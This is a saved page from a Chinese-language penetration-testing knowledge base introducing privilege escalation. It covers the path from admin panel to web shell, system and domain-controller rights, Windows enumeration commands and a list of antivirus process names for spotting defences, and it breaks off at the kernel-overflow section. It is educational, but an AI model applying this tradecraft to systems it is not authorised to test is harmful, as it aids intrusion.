<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper docs-doc-page docs-version-current plugin-docs plugin-id-default docs-doc-id-权限提升/权限提升">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v2.4.1">
<title data-rh="true">权限提升介绍 | Adm8n</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://Adm8n.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://Adm8n.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://Adm8n.github.io/docs/权限提升/"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="权限提升介绍 | Adm8n"><meta data-rh="true" name="description" content="这里需要我们了解的权限提升大概分为：后台权限，网站权限，数据本权限。接口权限，系统权限。域控权限等。"><meta data-rh="true" property="og:description" content="这里需要我们了解的权限提升大概分为：后台权限，网站权限，数据本权限。接口权限，系统权限。域控权限等。"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://Adm8n.github.io/docs/权限提升/"><link data-rh="true" rel="alternate" href="https://Adm8n.github.io/docs/权限提升/" hreflang="zh"><link data-rh="true" rel="alternate" href="https://Adm8n.github.io/docs/权限提升/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Adm8n RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Adm8n Atom Feed"><link rel="stylesheet" href="/assets/css/styles.5c8c3f00.css">
<link rel="preload" href="/assets/js/runtime~main.41533b7a.js" as="script">
<link rel="preload" href="/assets/js/main.103d9737.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){var t=null;try{t=new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}return t}()||function(){var t=null;try{t=localStorage.getItem("theme")}catch(t){}return t}();t(null!==e?e:"light")}()</script><div id="__docusaurus">
<div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="My Site Logo" class="themedImage_ToTc themedImage--light_HNdA"><img src="/img/logo.svg" alt="My Site Logo" class="themedImage_ToTc themedImage--dark_i4oU"></div><b class="navbar__title text--truncate">Adm8n知识库</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">我の知识库</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/blog">blog施工中</a><a href="https://blog.csdn.net/weixin_45971758" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">CSDN<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="searchBox_ZlJk"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0 docsWrapper_BCFX"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docPage__5DB"><aside class="theme-doc-sidebar-container docSidebarContainer_b6E3"><div class="sidebarViewport_Xe31"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">欢迎来到 我の知识库</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/docs/category/权限提升">权限提升</a><button aria-label="打开/收起侧边栏菜单「权限提升」" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/权限提升/Windows权限提升—MySQL数据库提权">前言</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/权限提升/windows 提权——数据库提权">windows 提权——数据库提权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/权限提升/">权限提升介绍</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/category/启明星辰溯源工程师">启明星辰溯源工程师</a><button aria-label="打开/收起侧边栏菜单「启明星辰溯源工程师」" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/category/安全杂七杂八">安全杂七杂八</a><button aria-label="打开/收起侧边栏菜单「安全杂七杂八」" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/HTTPS  TLSv1.3">HTTPS &amp;&amp; HTTPS</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/Hadoop 部署与使用">Hadoop 部署与使用</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/docs/OKR/目标管理法 OKR">OKR</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/docs/内网小姿势/Ettercap实现内网劫持目标主机DNS">内网小姿势</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/docs/小迪安全/65内网渗透">小迪安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/docs/漏洞复现/HIKVISION 综合安防管理平台任意文件上传">漏洞复现</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" aria-expanded="false" href="/docs/语雀图床迁移问题/域渗透基础知识二(1)">语雀图床迁移问题</a></div></li></ul></nav></div></div></aside><main class="docMainContainer_gTbr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/category/权限提升"><span itemprop="name">权限提升</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">权限提升介绍</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><h1>权限提升介绍</h1><p>这里需要我们了解的权限提升大概分为：后台权限，网站权限，数据本权限。接口权限，系统权限。域控权限等。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="权限说明">权限说明<a href="#权限说明" class="hash-link" aria-label="权限说明的直接链接" title="权限说明的直接链接">​</a></h2><ul><li>后台权限:SQL注入,致据库备份泄露，默认或弱口令等获取帐号密码进入。</li><li>网站权限:后台提升至网站权限，RCE或文件操作类、反序列化等漏洞直达shell。</li><li>数据库权限:SQL注入数据库备份泄露。默认或弱口令等进入或网站权限获取后转入。</li><li>接口权限:SQL注入,数据库备份泄露，源码泄漏，配置不当等或网站权限获取后转入。</li><li>系统权限:高危系统漏洞直达或网站权限提升转入、数据库权限提升转入。第三方转入等。</li><li>域控权限:高危系统漏洞直达或内网横向渗透转入，域控其他服务安全转入等。</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="权限提升后操作">权限提升后操作<a href="#权限提升后操作" class="hash-link" aria-label="权限提升后操作的直接链接" title="权限提升后操作的直接链接">​</a></h2><p>需要我们了解权限提升后能够做什么事情，这里针对不同的权限，能够做的事情也是不同的。</p><ul><li>后台权限：常规WEB界面文章分类等操作,后台功能可操作类。</li><li>网站权限:查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等)，还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li><li>数据库权限:操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配詈文件读取获得。也可以作为提升系统权限手段。</li><li>接口权限:后台或网站权限后的获取途径:后台（修改配置信息功能点)，网站权限(查看的配置文件获取)，具体可以操作的事情大家自己想想。</li><li>系统权限:如同在你自己操作自己的电脑一样。</li><li>域控权限:如同在你自己操作自己的虚拟机一样。</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="权限提升的意义">权限提升的意义<a href="#权限提升的意义" class="hash-link" aria-label="权限提升的意义的直接链接" title="权限提升的意义的直接链接">​</a></h2><p>这里的意义就是实现你想要达到的效果，例如当你获取到一个服务器后，你想要开启远程桌面，但是你的权限不够，那么你就需要对你的权限进行提示，以便实现开启远程桌面的能力，这就是权限提示的意义。</p><p>同时后期也需要经常使用到权限提升，当然权限提升前提就需要得到一个主机。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="权限提升整体流程">权限提升整体流程<a href="#权限提升整体流程" class="hash-link" aria-label="权限提升整体流程的直接链接" title="权限提升整体流程的直接链接">​</a></h2><p>后台权限&gt;web权限&gt;系统权限&gt;域控权限</p><p>这里简要说一下，首先需要获取到后台权限，然后获取到web权限，这里的web权限也就是获取到网站的权限，其次，当获取到web权限后通过一系列方式获取到系统权限，而域控权限，可能在部分网络结构中没有域控的概念，那么当你获取到系统权限后，基本上就结束了，但是可能在有些网络结构中比较关注域控，那么你还需要进一步的去获取域控权限。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="权限获取方式">权限获取方式<a href="#权限获取方式" class="hash-link" aria-label="权限获取方式的直接链接" title="权限获取方式的直接链接">​</a></h2><p>通常来说，不同的权限对应的获取方式也不同，当然也有部分权限获取的方式是一样的。同时在权限获取的时候有些权限获取是不确定在流程中哪一步中获取到的，比如接口权限、数据库权限、</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="特殊类型权限获取流程">特殊类型权限获取流程<a href="#特殊类型权限获取流程" class="hash-link" aria-label="特殊类型权限获取流程的直接链接" title="特殊类型权限获取流程的直接链接">​</a></h3><p>这里的特殊类型的权限获取，主要就说的是接口权限、数据库权限这类的获取，通常像后台权限、web权限获取都是有流程性的，而且这类是没有流程性的，例如：</p><ul><li>数据库权限：数据库权限可能在获取后台之前就获取到了，比如，通过扫描开放的端口，然后使用弱口令进去了，这种情况就属于在后台权限获取之前，而如果是通过sql注入获取到账号密码，那么就是在后台之后，所以说不定。</li><li>接口权限：基本上也是这样的，可能在之前就获取了，也有可能在之后获取。</li></ul><h3 class="anchor anchorWithStickyNavbar_LWe7" id="普通类型权限获取流程">普通类型权限获取流程<a href="#普通类型权限获取流程" class="hash-link" aria-label="普通类型权限获取流程的直接链接" title="普通类型权限获取流程的直接链接">​</a></h3><p>平台类型权限获取，就是通常来说，都是这样的进行获取的，通常来说，不是必然.......</p><ul><li>后台权限获取方式：弱口令、sql注入、数据泄露等。</li><li>web权限获取方式：插件应用、数据库、中间件、网站源码后台获取。</li><li>系统权限获取方式(Windows)：溢出漏洞、数据库、第三方软件等。</li></ul><h1>中间件语言类权限差异</h1><h2 class="anchor anchorWithStickyNavbar_LWe7" id="常见的语言">常见的语言<a href="#常见的语言" class="hash-link" aria-label="常见的语言的直接链接" title="常见的语言的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="jsp权限">JSP权限<a href="#jsp权限" class="hash-link" aria-label="JSP权限的直接链接" title="JSP权限的直接链接">​</a></h3><p>这里我们执行一个id后，显示的是root权限，如果想了解id这个命令是什么意思，可以去学一下Linux系统权限。这里网站是由jsp搭建的，这里需要注意jsp、java搭建的站点在连接上去后都是管理员权限，这是特性，不需要提权，直接就是系统权限。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/TRmofKAr3cyb2eP.png#alt=image-20230314200032658" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="php权限">PHP权限<a href="#php权限" class="hash-link" aria-label="PHP权限的直接链接" title="PHP权限的直接链接">​</a></h3><h4 class="anchor anchorWithStickyNavbar_LWe7" id="linux中php权限">Linux中PHP权限<a href="#linux中php权限" class="hash-link" aria-label="Linux中PHP权限的直接链接" title="Linux中PHP权限的直接链接">​</a></h4><p>这里执行完是一个普通账户权限，并非是root权限，而这里是一步一步搭建的，就会按照软件上自己配置设定的权限。而这里的权限就只是一个普通用户权限，无法查询其它的内容，只能查看当前软件产生的目录也就是网站目录。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/Vpbkq6ejzXBsGgF.png#alt=image-20230314200512573" class="img_ev3q"></p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="windows中php权限">Windows中PHP权限<a href="#windows中php权限" class="hash-link" aria-label="Windows中PHP权限的直接链接" title="Windows中PHP权限的直接链接">​</a></h4><p>这里同样也是一个普通账户权限，并非是Windows系统中最高权限，这里需要注意，如果是直接使用类似phpstudy这个集成环境搭建的网站就会继承搭建人的权限。</p><p>而这里想看什么就能看什么内容，因为权限够的，相当于就是本地管理员权限。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/YGmDMybAj4dBnpr.png#alt=image-20230314200600654" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="asp权限">ASP权限<a href="#asp权限" class="hash-link" aria-label="ASP权限的直接链接" title="ASP权限的直接链接">​</a></h3><p>这里获取到的权限是网络服务权限，也并非是Windows系统中最高权限，这里也是需要提权的。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/GtWRI9yom3BHLVv.png#alt=image-20230314200837852" class="img_ev3q"></p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="aspx权限">ASPX权限<a href="#aspx权限" class="hash-link" aria-label="ASPX权限的直接链接" title="ASPX权限的直接链接">​</a></h3><p>同样这里获取到的权限是网络服务权限，也并非是Windows系统中最高权限，这里也是需要提权的。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/RTBkL2Q7z6W4KZn.png#alt=image-20230314201217779" class="img_ev3q"></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="权限划分">权限划分<a href="#权限划分" class="hash-link" aria-label="权限划分的直接链接" title="权限划分的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="linux">Linux<a href="#linux" class="hash-link" aria-label="Linux的直接链接" title="Linux的直接链接">​</a></h3><p>管理员UID为0：系统管理员。</p><p>系统用户UID为1-999：Linux中设置的系统用户。</p><p>普通用户UID为1000开始：由管理员创建用于日常工作的用户。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="windows">Windows<a href="#windows" class="hash-link" aria-label="Windows的直接链接" title="Windows的直接链接">​</a></h3><p>用户及用户组：system、Administrator、user、guest等。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="注意点">注意点<a href="#注意点" class="hash-link" aria-label="注意点的直接链接" title="注意点的直接链接">​</a></h2><p>这里不代表名称不是root或者administrator就不是管理权限，因为在这些系统中会存在一些组的原因，当管理员把账户添加进入管理员组中，那么就能够执行管理员权限。</p><p>同时在Linux中是没预留账户，直接会给你root账户，而Windows系统中只会给你一个administrator权限，Windows系统会预留一个system账户，这个账户和Linux中root账户是一样的都是最高权限。</p><p>所以在后面的权限提升的时候，我们都需要讲账户提升至最高权限才能想干嘛干嘛。</p><h1>后台权限与web权限提升</h1><p>关于这里不会过多的赘述，因为在web漏洞方面都已经提到过了，不过都需要文件上传或者进行代码执行，讲shell写入，如果这个都过不去，那么后续的提升肯定是困难的，甚至直接就是无法操作。</p><p>当然也有一些网站后台功能点少，没有办法进行shell，那么也同样，确实无法获取权限。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="后台权限提升">后台权限提升<a href="#后台权限提升" class="hash-link" aria-label="后台权限提升的直接链接" title="后台权限提升的直接链接">​</a></h2><p>关于后台权限提升这里，多数都是通过弱口令，或者sql注入获取，这里我就不赘述了，这类也是最基础的，同时也的最需要破解的，通常来说，如果破解不了后台就很难获取web权限。</p><p>当然不是说只有获取后台权限才能获取web权限，也可以通过web权限获取后台权限，不过这类都需要基于类似先获取数据库权限才能够进行操作。</p><p>当然遇到一个程序如果无思路，可以通过先搜索相关的程序名称拿shell的资料，网上一般有很多这里的操作。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="web权限提升">web权限提升<a href="#web权限提升" class="hash-link" aria-label="web权限提升的直接链接" title="web权限提升的直接链接">​</a></h2><p>关于web权限提升方式，可以通过之前学过的，例如数据库备份泄露、账户密码、中间件漏洞、cms源码漏洞等均可以获取web权限，包括暴力破解等，都可以对web的权限进行提升，简单来说，web权限提升其实就是获取网站管理权限。</p><p>web权限提升获取，其实还是有很多方式的，这里只是一些常见的方式，如果还是没有思路，最简单的方式就是搜资料！！搜资料！！搜资料！！</p><p>当然web权限提升不单单可以通过这些方式，还可以通过数据库弱口令获取到数据库密码，例如在部分网站中会存在phpmyadmin的数据库管理平台，网上有很多这个平台获取权限的方式，这里就不说了，当获取到这个权限后，那么就可以写入shell，通过webshell管理软件连接上去，翻目录通常就能找到后台密码。</p><p>这里多数就是实现数据库权限提升到web权限提升的跨域。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/AjzLmloqSxYBZyd.png#alt=image-20230314204912738" class="img_ev3q"></p><p>但是这里不单单只有数据库权限跨域到web权限，也会存在web权限跨域到数据库权限。那么web权限也可以通过第三方插件或者第三方软件的漏洞获取web权限，然后通过连接shell，然后在网站目录中寻找源码，通常就能够寻找到数据库的账户密码。</p><p><img loading="lazy" src="https://s2.loli.net/2023/03/14/S1LEWj6ADgTHwcy.png#alt=image-20230314205437593" class="img_ev3q"></p><h1>Windows提权</h1><p>Windows提权大概有三个方向：溢出提权、数据库提权、第三方软件提权、错误的系统配置提权、组策略首选项提权、窃取令牌提权、bypassuac提权，第三方软件/服务提权，WEB中间件漏洞提权等。</p><p>如果遇到无法执行命令的话，可以试着上传cmd.exe文件之可执行的目录下。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="windows提权常见步骤">Windows提权常见步骤<a href="#windows提权常见步骤" class="hash-link" aria-label="Windows提权常见步骤的直接链接" title="Windows提权常见步骤的直接链接">​</a></h2><h3 class="anchor anchorWithStickyNavbar_LWe7" id="信息收集">信息收集<a href="#信息收集" class="hash-link" aria-label="信息收集的直接链接" title="信息收集的直接链接">​</a></h3><p>信息收集》操作系统版本》系统位数》漏洞补丁》杀软防护》网络》当前权限等信息。</p><h4 class="anchor anchorWithStickyNavbar_LWe7" id="常见命令">常见命令<a href="#常见命令" class="hash-link" aria-label="常见命令的直接链接" title="常见命令的直接链接">​</a></h4><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">systeminfo  查询系统信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hostname    主机名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user    查看用户信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">netstat -ano|find &quot;3389&quot;   查看服务pid号</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wmic os get caption        查看系统名</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wmic qfe get Description,HotFixID,InstalledOn   查看补丁信息</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wmic product get name,version   查看当前安装程序</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wmic service list brief   查询本机服务</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">wmic process list brief   查询本机进程</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net share   查看本机共享列表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">netsh firewall show config  查看防火墙配置</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h4 class="anchor anchorWithStickyNavbar_LWe7" id="常见杀软程序名称">常见杀软程序名称<a href="#常见杀软程序名称" class="hash-link" aria-label="常见杀软程序名称的直接链接" title="常见杀软程序名称的直接链接">​</a></h4><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">360sd.exe     360杀毒</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">360tray.exe   360实时保护</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ZhuDongFangYu.exe   360主动防御</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">KSafeTray.exe 金山卫士</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SafeDogUpdateCenter.exe   安全狗</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">McAfee McShield.exe   McAfee</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">egui.exe    NOD32</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AVP.exe     卡巴斯基</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">avguard.exe  小红伞</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bdagent.exe  BitDefender</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RavMonD.exe  瑞星杀毒</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">QQPCRTP.exe  QQ电脑管家</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">hipstray.exe 火绒杀毒</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="溢出提权">溢出提权<a href="#溢出提权" class="hash-link" aria-label="溢出提权的直接链接" title="溢出提权的直接链接">​</a></h2><p>基于补丁》系统版本》位数来筛选可用溢出漏洞EXP。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="溢出提权介绍">溢出提权介绍<a href="#溢出提权介绍" class="hash-link" aria-label="溢出提权介绍的直接链接" title="溢出提权介绍的直接链接">​</a></h3><p>此提权方法是利用系统本身存在的一些系统内核溢出漏洞，但未曾打相应的补丁，攻击者通过对比systeminfo信息中的补丁信息来查找缺失的补丁号，通过缺失补丁号对照相应的系统版本查找对应可以提权提升的exp。</p><p>不过这里需要注意，只要对应的补丁号加上对应的系统的版本的提权exp才可以成功，有时候如果查找到提权exp提权不成功，那么就可以查看是不是系统版本没对应上，且不排除一些提权漏洞利用需要相应的环境。</p><p>这里使用Windows10，同时基于已经拿到基础权限，并且通过文件上传连接到Windows10系统上了。</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="溢出提权三种方式">溢出提权三种方式<a href="#溢出提权三种方式" class="hash-link" aria-label="溢出提权三种方式的直接链接" 